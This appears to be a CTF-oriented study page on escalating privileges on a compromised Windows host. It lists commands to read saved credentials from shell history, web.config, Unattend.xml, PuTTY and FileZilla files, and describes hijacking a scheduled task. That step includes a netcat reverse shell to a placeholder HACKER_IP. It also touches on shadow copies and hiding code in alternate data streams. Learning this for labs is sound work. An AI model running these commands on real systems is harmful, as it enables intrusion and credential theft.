# Compromise a Windows host

[![windowsfundamentals1xbx](../../_badges/thm/windowsfundamentals1xbx.svg)](https://tryhackme.com/room/windowsfundamentals1xbx)
[![windowsfundamentals2x0x](../../_badges/thm/windowsfundamentals2x0x.svg)](https://tryhackme.com/room/windowsfundamentals2x0x)
[![windowsfundamentals3xzx](../../_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)
[![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![windows_privilege_escalation](../../_badges/poat/windows_privilege_escalation.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

<div class="row row-cols-md-2"><div>

As there isn't much we can do as a regular user, we will try to elevate our level of privileges to Administrator, or system. You may have to do horizontal escalation first, i.g. moving to another account that has the same level of privilege, but may have different permissions.

* Misconfigurations <small>(user permissions...)</small>
* Missing security updates <small>(vulnerable OS, software...)</small>
* Find vulnerable scheduled tasks/services

The **goal is to pop out a powershell/cmd as root** (root shell), basically, the same as selecting "run as administrator" for one of them.

</div><div>

There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

* [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) (10.5k ⭐)
* [PrivescCheck](https://github.com/itm4n/PrivescCheck) (1.8k ⭐)
* [PowerUp](https://github.com/HarmJ0y/PowerUp) (222⭐) that was deprecated over [PowerTools](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (1.8k ⭐) that was deprecated again over [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) (10k ⭐) which is now archived 😂. PowerUp from PowerSploit is still used.
</div></div>

<hr class="sep-both">

## Find credentials

<div class="row row-cols-md-2 mt-4"><div>

* ➡️ List saved credentials by Windows

```bash
PS> cmdkey /list
# use to start a root shell
PS> runas /savecred /user:admin cmd.exe
```

* ➡️ See the shell history

```bash
PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* ➡️ Check the browser saved credentials

* ➡️ Check the registry (need admin)
</div><div>

* ➡️ List credentials saved by applications

```bash
# Internet Information Services (IIS) = the default web server
PS> type C:\inetpub\wwwroot\web.config | findstr connectionString
PS> type C:\Windows\Microsoft.NET\Framework64\vX.X.XXXXX\Config\web.config | findstr connectionString
# Windows Deployment Services (credentials of the admin that
# deployed the OS image to several hosts, referred as "Unattended")
PS> type C:\Unattend.xml
PS> type C:\Windows\Panther\Unattend.xml
PS> type C:\Windows\Panther\Unattend\Unattend.xml
PS> type C:\Windows\system32\sysprep.inf
PS> type C:\Windows\system32\sysprep\sysprep.xml
# Putty
PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# VNC servers
# FileZilla
PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
```
</div></div>

<hr class="sep-both">

## Exploit scheduled tasks

<div class="row row-cols-md-2"><div>

List scheduled tasks

```bash
PS> schtasks
```

Then, you can query more info on a task (ex: `example_task`) with

```bash
PS> schtasks /query /tn example_task /fo list /v
```

</div><div>

The **Task To Run** is the most important. If you can inject or edit the binary, then you must find another task. The **Run As User** will help when considering a task over another.

```bash
# check permissions
PS> icacls task_to_run
# ex: replace the binary
CMD> echo %temp%\nc64.exe -e cmd.exe HACKER_IP PORT > task_to_run
```

In CTF, instead of waiting, you may be able to start the task manually.

```bash
PS> schtasks /run /tn taskname
```
</div></div>

<hr class="sep-both">

## Volume Shadow Copy Service (VSS)

<div class="row row-cols-md-2"><div>

The Volume Shadow Copy Service (VSS) is handling the creation, and management of **shadow copies**/**snapshot** of the data backed up.  They are stored in the volume information of each drive that has the feature enabled.

They may allow a system admin to restore the system after an attack. So, hackers will most likely check them, and delete them. There may exist a "offline" version of these shadow copies.
</div><div>

To manage them

* Right-click on a hard-drive
* Select Shadow copies

> See [Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
</div></div>

<hr class="sep-both">

## Alternate Data Streams (ADS)

<div class="row row-cols-md-2"><div>

On a file system using NTFS, ADS allow files to have more than one stream (`flux`) of data. By default, every file has only one stream: **:$DATA**. You can inspect a file using

```powershell
> Get-Item -Path SomeFile -Stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::XXX\toto.pdf::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::XXX
PSChildName   : toto.pdf::$DATA
PSDrive       : XXX
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : XXX\toto.pdf
Stream        : :$DATA
Length        : 0
```
</div><div>

They can be used by Windows to store data, such as identifier on a file telling the operating system that this file was download from the Internet.

Hackers can use that to store malicious code inside a file. They can execute it like this later, for instance using a legit/non-malicious application

```powershell
> $(Resolve-Path .\file.exe:stream)
```

More about it:

* [Introduction to Alternate Data Streams](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams)
</div></div>